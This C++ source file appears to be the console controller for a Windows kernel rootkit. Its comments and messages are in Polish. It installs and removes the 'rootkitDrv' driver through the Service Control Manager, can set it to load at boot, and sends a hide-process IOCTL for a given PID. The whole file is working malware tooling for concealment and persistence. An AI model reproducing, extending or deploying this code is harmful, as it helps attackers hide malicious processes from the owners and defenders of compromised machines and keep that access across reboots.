// myRootkitShell.cpp : Defines the entry point for the console application.
//

#include <windows.h>
#include <stdio.h>
#include "rk_install.c"
#include "rk_IoControl.h"

#define DRIVER_NAME				"rootkitDrv"

HANDLE hRootkit;

bool HideProcess(DWORD pid);

bool HideProcess(DWORD pid)
{
	DWORD dwReturn;

	hRootkit = CreateFile(
			"\\\\.\\rootkitDrv", 
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ, NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

	if ( !hRootkit ) 
		return false;

	if (!DeviceIoControl(hRootkit, 
			IOCTL_HIDE_PROCESS, 
			&pid,
			sizeof(pid), 
			NULL, 
			0, 
			&dwReturn, 
			NULL))
	{
		printf("Blad podczas komunikacji z rootkitem\n");
		return false;
	}

	CloseHandle( hRootkit );

	return true;
}

void ShowUsage()
{
	printf("rootkitMan.exe 1.0\n");
	printf("l		ladowanie sterownika\n");
	printf("w		wyladowanie sterownika\n");
	printf("p	pid	ukrywanie procesu\n");
	printf("\n");
}


int main(int argc, char* argv[])
{

	if (argc < 3) {
		ShowUsage();
		return 0;
	}

	// ladowanie rootkita na zadanie za pomoca menadzera us³ug (Service Manager)
	if (argv[1][0] == 'l') { 
		if  (!myFileExists( argv[2] )) {
			return 0;
		}
		printf("Instalowanie rootkita\n");

		if (!ManageDriver(DRIVER_NAME, argv[2], DRIVER_FUNC_INSTALL	))
		{
			printf("Blad podczas instalacji\n");
			ManageDriver(DRIVER_NAME, argv[2], DRIVER_FUNC_REMOVE	);
		}	
		else
			printf("Rootkit zainstalowany");
		return 0;
	}
	else	
	// wyladowanie rootkita
	if (argv[1][0]=='w') {
		if  (!myFileExists( argv[2] )) {
			return 0;
		}

		printf("Wyladowanie drivera...\n");
		if (!ManageDriver(DRIVER_NAME, argv[2] ,DRIVER_FUNC_REMOVE	))
		{
			printf("Blad podczas ladowania sterowanika\n");
		}
		else
			printf("Sterowanik wyladowany\n");
		return 0;
	}	
	else
	// ladowanie rootkita na zadanie (bedzie sie uruchamial przy starcie)
	if (argv[1][0] == 's') { 
		if  (!myFileExists( argv[2] )) {
			return 0;
		}
		printf("Instalowanie rootkita\n");

		if (!ManageDriver(DRIVER_NAME, argv[2], DRIVER_FUNC_INSTALL_AT_BOOT	))
		{
			printf("Blad podczas instalacji\n");
			ManageDriver(DRIVER_NAME, argv[2], DRIVER_FUNC_REMOVE	);
		}	
		else
			printf("Rootkit zainstalowany");
		return 0;
	}

	if (strcmp( "p" , argv[1] ) == 0 ) {
		if (HideProcess( atoi( argv[2] )) == true)
			printf("Proces %s schowany\n",argv[2]);
		else
			printf("Blad podczas chowania procesu");
	}

	return 0;
}

